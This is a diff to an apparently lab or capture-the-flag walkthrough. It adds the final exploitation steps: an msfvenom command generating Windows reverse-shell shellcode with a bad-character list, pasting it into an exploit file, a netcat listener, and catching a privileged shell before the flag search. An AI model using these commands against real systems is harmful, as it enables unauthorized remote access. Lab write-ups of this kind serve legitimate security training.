@@ -86,6 +86,28 @@ Looking at the code for the exploit, we see that we need to use msvenom to gener
 
 Using msfvenom (and the bad string provided in the exploit code, we will use this command to generate our shellcode:
 
-msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.210 LPORT=80-f c -b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a" -e x86/alpha_mixed
+msfvenom -p windows/shell_reverse_tcp -b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a" LHOST=192.168.49.60 LPORT=4444 -e x86/alpha_mixed -f c
 
-\--- COMING SOON ---
+This generates our shellcode
+
+![](/static/img/screenshot-2024-07-25-at-5.44.18 pm.png)
+
+Then, we paste our shellcode into the exploit file, replacing the previous version:
+
+![](/static/img/screenshot-2024-07-25-at-5.45.47 pm.png)
+
+Now we are ready, so we use a new terminal window to open a netcat listener with this command:
+
+`nc -nlvp 4444`
+
+On a separate window, we run the exploit file (I got errors using python3, so tried python2:
+
+![](/static/img/screenshot-2024-07-25-at-5.50.39 pm.png)
+
+We go to our netcat listener and we got a reverse shell! The shell is privileged so escalation is not required.
+
+![](/static/img/screenshot-2024-07-25-at-5.53.00 pm.png)
+
+Now we look for the flag.
+
+![](/static/img/screenshot-2024-07-25-at-5.57.44 pm.png)
